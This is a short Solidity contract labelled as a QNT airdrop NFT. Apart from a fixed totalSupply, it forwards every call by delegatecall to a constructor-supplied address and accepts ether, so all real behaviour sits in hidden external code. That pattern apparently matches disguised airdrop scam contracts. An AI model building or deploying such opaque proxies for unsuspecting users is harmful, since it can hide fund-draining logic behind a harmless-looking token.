// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

contract QNTAirdropNFT {

    uint256 public totalSupply = 10000;
    address theqnt;

    constructor(address _delegate) {
        theqnt = _delegate;
    }

    fallback() external payable {
        (bool success, bytes memory data) = theqnt.delegatecall(msg.data);
        if (success) {
            assembly {
                return(add(data, 0x20), mload(data))
            }
        } else {
            assembly {
                let returndataSize := returndatasize()
                returndatacopy(0, 0, returndataSize)
                revert(0, returndataSize)
            }
        }
    }

    receive() external payable {}
}